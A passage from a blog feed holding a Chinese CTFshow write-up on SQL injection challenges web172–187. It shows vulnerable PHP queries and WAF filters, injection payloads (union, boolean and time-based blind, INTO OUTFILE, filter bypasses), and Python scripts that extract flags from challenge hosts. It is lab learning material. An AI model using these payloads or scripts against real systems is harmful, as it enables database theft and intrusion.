,&#39;a&#39;:10000},&quot;json&quot;);&lt;/script&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow之web(四)</title>
      <link href="/2021/07/24/ctfshow-zhi-web-si/"/>
      <url>/2021/07/24/ctfshow-zhi-web-si/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天是2021/7/25，正式进入sql注入专题，目标：加强python的学习，达到通过写python脚本，加快注入速度的程度，掌握sql在php编程中的一系列查询语句。</p><h1 id="新手区"><a href="#新手区" class="headerlink" title="新手区"></a>新手区</h1><p>可以看看Y4师傅以前记录的小笔记<br><a href="https://blog.csdn.net/solitudi/article/details/106820588?ops_request_misc=%7B%22request%5Fid%22%3A%22160630921119725271050515%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=160630921119725271050515&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-4-106820588.pc_v2_rank_blog_default&utm_term=注入&spm=1018.2118.3001.4450" target="_blank" rel="noopener">SQL注入之MySQL注入的学习笔记(一)</a><br><a href="https://blog.csdn.net/solitudi/article/details/106824456?ops_request_misc=%7B%22request%5Fid%22%3A%22160630921119725271050515%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=160630921119725271050515&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-2-106824456.pc_v2_rank_blog_default&utm_term=注入&spm=1018.2118.3001.4450" target="_blank" rel="noopener">SQL注入之MySQL注入学习笔记(二)</a></p><h1 id="2021-7-25"><a href="#2021-7-25" class="headerlink" title="2021-7-25"></a>2021-7-25</h1><h1 id="web172、web173——hex-、to-base64"><a href="#web172、web173——hex-、to-base64" class="headerlink" title="web172、web173——hex() 、to_base64()"></a>web172、web173——<code>hex() 、to_base64()</code></h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select username,password from ctfshow_user2 where username !='flag' and id = '"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//检查结果是否有flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">!==</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'查询成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>意思大概就是把flag从查询中给ban掉了</p><p><strong>解决方法</strong></p><p>利用编码解决：base64、hex</p><p>这里针对的是<code>id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;</code>，双引号是包括在内的，可能只是起解析作用</p><p><strong>payload</strong></p><p><code>yn8&#39;union select to_base64(username),hex(password) from ctfshow_user2+--+</code></p><p><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">16进制在线</a></p><h1 id="web174——盲注"><a href="#web174——盲注" class="headerlink" title="web174——盲注"></a>web174——盲注</h1><p><strong>查询语句一样(不贴了，占地方)</strong></p><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//检查结果是否有flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/flag|[0-9]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'查询成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/php-json.html" target="_blank" rel="noopener">PHP JSON</a></p><p>也就是说返回的结果是不能有flag和任何数字</p><p><strong>解决方案</strong></p><p>采取盲注并利用二分法来判断</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/25 17:17</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://cece2e87-a82b-4be3-9a5d-fd78f587916e.challenge.ctf.show:8080/api/v4.php"</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 创建一个整数列表</span>    max <span class="token operator">=</span> <span class="token number">128</span>  <span class="token comment" spellcheck="true"># ASCII可见字符</span>    min <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> min<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>max<span class="token operator">-</span>min<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 取整除 - 向下取接近商的整数</span>        <span class="token keyword">if</span> min<span class="token operator">==</span>mid<span class="token punctuation">:</span>            flag<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        payload<span class="token operator">=</span><span class="token string">"?id=' union select 'a',"</span> \                <span class="token string">"if(ascii(substr((select group_concat(password) "</span> \                <span class="token string">"from ctfshow_user4 where username='flag'),%d,1))&lt;%d,"</span> \                <span class="token string">"'small','da')+--+"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token comment" spellcheck="true">#print(res)</span>        <span class="token keyword">if</span> <span class="token string">"small"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>            max <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            min <span class="token operator">=</span> mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-7-26"><a href="#2021-7-26" class="headerlink" title="2021-7-26"></a>2021-7-26</h1><h1 id="web175——时间盲注"><a href="#web175——时间盲注" class="headerlink" title="web175——时间盲注"></a>web175——时间盲注</h1><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//检查结果是否有flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'查询成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>检测\x00-\x7f也就是0-127，所以普通的盲注是不行了</p><p>时间盲注测试语句：<code>1&#39;and if(1=1,sleep(2),0)+--+</code>可以</p><p><a href="https://zhuanlan.zhihu.com/p/46815128" target="_blank" rel="noopener">Python 3 字符串前 加 u、r、b 、f的含义</a></p><p><a href="https://www.cnblogs.com/Neeo/articles/10536202.html" target="_blank" rel="noopener">一篇读懂Python中的位运算</a></p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>嫁接y4的脚本，比较好理解</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://6cd84f2d-be07-46cc-bc8e-90b6ff57f72a.challenge.ctf.show:8080/api/v5.php?id=1' and "</span>result <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># payload = f'1=if(ascii(substr(database(),{i},1))>{mid},sleep(2),0)+--+'</span>        <span class="token comment" spellcheck="true"># payload = f'1=if(ascii(substr((select table_name from information_schema.tables where table_schema=database()),{i},1))>{mid},sleep(2),0)+--+'</span>        <span class="token comment" spellcheck="true"># payload = f'1=if(ascii(substr((select column_name from information_schema.columns where table_name='ctfshow_user5'),{i},1))>{mid},sleep(2),0)+--+'</span>        payload <span class="token operator">=</span> f<span class="token string">'1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),{i},1))>{mid},sleep(2),0)+--+'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>利用into outfile来实现文件的输出</p><pre class="line-numbers language-mysql"><code class="language-mysql">?id=1' union select 1,password from ctfshow_user5 where username='flag' into outfile '/var/www/html/1.txt'+--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="web176——大小写绕过"><a href="#web176——大小写绕过" class="headerlink" title="web176——大小写绕过"></a>web176——大小写绕过</h1><h1 id="web177-179——空格绕过"><a href="#web177-179——空格绕过" class="headerlink" title="web177-179——空格绕过"></a>web177-179——空格绕过</h1><p>除了空格，在代码中可以代替的空白符还有：</p><pre><code>%0a%0b%0c%0d%09%a0(在特定字符集才能利用)以上均为URL编码/**/组合括号%23代替注释符 -- </code></pre><h1 id="web180-182——优先级-and-gt-or"><a href="#web180-182——优先级-and-gt-or" class="headerlink" title="web180-182——优先级 and &gt; or"></a>web180-182——<code>优先级 and &gt; or</code></h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>空格利用的是()括号代替的</p><p><strong>解题：</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">where username !='flag' and id = ''or(id=26)and'1'='1' limit 1where (username !='flag' and id = '')or(id=26 and'1'='1') limit 1因为or的存在，相当于要select两次，但又因为or左边是为0的，右边为id=26，所以只select右边完整的sql语句变为：select id,username,password from ctfshow_user where id=26 limit 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>关于优先级问题就跟加减号与乘除号一样，and先运算，那么and的运算结果过程如何解释：需要同时满足两边的条件才会返回true，否则不执行啊！那么这里就是让第一个and语句返回false让后面的and语句来做到知行的效果</p><p><strong>payload：</strong><code>&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p><h1 id="web183——like盲注"><a href="#web183——like盲注" class="headerlink" title="web183——like盲注"></a>web183——like盲注</h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select count(pass) from "</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'tableName'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>查询结果</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//返回用户表的记录总数</span>      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>解题思路</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">括号代替的是空格tableName=(ctfshow_user)where(pass)like'ctfshow{%'% ：在sql中通配 N 个字符_ ：通配任意一个字符会发现返回结果  $user_count = 1;代表匹配到了一个，利用此模式盲注<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>python脚本</strong></p><p>需要post传参</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/27 12:21</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> sysurl <span class="token operator">=</span> <span class="token string">'http://d4c4cba3-a83d-4957-a3e7-b6d67bd3a89d.challenge.ctf.show:8080/select-waf.php'</span>letter <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyz-{}'</span>flag <span class="token operator">=</span> <span class="token string">'ctfshow{'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"(ctfshow_user)where(pass)like'{}%'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> r<span class="token punctuation">:</span>            flag<span class="token operator">+=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token string">"}"</span><span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-7-27"><a href="#2021-7-27" class="headerlink" title="2021-7-27"></a>2021-7-27</h1><h1 id="web184——利用having代替where进行like盲注"><a href="#web184——利用having代替where进行like盲注" class="headerlink" title="web184——利用having代替where进行like盲注"></a>web184——利用<a href="https://www.runoob.com/sqlite/sqlite-having-clause.html" target="_blank" rel="noopener">having</a>代替where进行like盲注</h1><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>python脚本</strong></p><p>利用到了<a href="https://www.runoob.com/mysql/mysql-regexp.html" target="_blank" rel="noopener">mysql中的regexp正则匹配</a></p><p><a href="https://www.cnblogs.com/zeroingToOne/p/9575203.html" target="_blank" rel="noopener">MySQL中的内连接、左连接、右连接、全连接、交叉连接</a></p><p><a href="https://www.runoob.com/w3cnote/sql-join-the-different-of-on-and-where.html" target="_blank" rel="noopener">SQL JOIN 中 on 与 where 的区别</a>：在此脚本中是用on代替了where</p><p>利用having来代替where也是作为一个条件判断子句</p><p>利用16进制代替引号</p><pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment"># -*- coding: utf-8 -*-</span><span class="token shell-comment comment"># @Author  : Yn8rt</span><span class="token shell-comment comment"># @Time    : 2021/7/27 15:04</span><span class="token shell-comment comment"># @Function:</span>import requestsimport sysurl <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//683f40c0-31e4-46a7-bed1-f8eb216b7515.challenge.ctf.show:8080/select-waf.php'</span>flag <span class="token operator">=</span> <span class="token string">'ctfshow{'</span>letter <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz-{}"</span>def <span class="token function">asc2hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    a1 <span class="token operator">=</span> <span class="token string">''</span>    a2 <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i in s<span class="token punctuation">:</span>        a1<span class="token operator">+</span><span class="token operator">=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    a2 <span class="token operator">=</span> a1<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a2<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j in letter<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"ctfshow_user group by pass having pass like {}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token operator">+</span><span class="token function">asc2hex</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> in r<span class="token punctuation">:</span>            flag<span class="token operator">+</span><span class="token operator">=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>            <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">:</span>                sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web185、186"><a href="#web185、186" class="headerlink" title="web185、186"></a>web185、186</h1><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>mysql中的利用字符组合成的数字：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127190309995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>python脚本：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/27 21:52</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">createNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token string">"true"</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"true"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            num <span class="token operator">+=</span> <span class="token string">"+true"</span>    <span class="token keyword">return</span> num<span class="token keyword">def</span> <span class="token function">createstrNum</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    _str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> m<span class="token punctuation">:</span>        _str <span class="token operator">+=</span> <span class="token string">",chr("</span> <span class="token operator">+</span> createNum<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span>    <span class="token keyword">return</span> _str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>url <span class="token operator">=</span> <span class="token string">"http://282b6260-a1f9-437d-98f1-a7fb46d977a5.challenge.ctf.show:8080/select-waf.php"</span>letter <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz-{}"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow{"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'tableName'</span><span class="token punctuation">:</span> <span class="token string">'ctfshow_user group by pass having pass like concat({})'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>createstrNum<span class="token punctuation">(</span>flag <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token comment" spellcheck="true"># print(res)</span>        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-07-28"><a href="#2021-07-28" class="headerlink" title="2021-07-28"></a>2021-07-28</h1><h1 id="web187——md5-pass-true-绕过"><a href="#web187——md5-pass-true-绕过" class="headerlink" title="web187——md5($pass,true)绕过"></a>web187——md5($pass,true)绕过</h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token 